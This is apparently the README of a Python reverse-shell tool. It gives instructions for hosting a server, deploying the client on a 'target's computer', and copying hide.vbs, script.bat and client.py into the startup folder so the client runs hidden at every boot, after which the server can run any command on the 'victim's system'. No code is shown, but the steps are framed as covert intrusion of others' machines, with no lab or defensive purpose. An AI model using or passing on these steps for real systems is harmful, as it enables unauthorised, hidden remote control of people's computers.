# reverse_shell

This is a reverse shell, implemented using client-server socket programming in python.

Download the all the files, host the server.py on a server and note the IP.
Enter the IP in the client.py and they deploy the client.py on the targets computer and run it.

To automate the running process on every system startup, copy hide.vbs, script.bat and client.py in the startup folder of the client.
Now on every start up the script will run in the background without any clue to your target client.

Once connected you will see the connection status in server.py and now server can pass any command to the victim's system which executes these commands and send the output back to server....
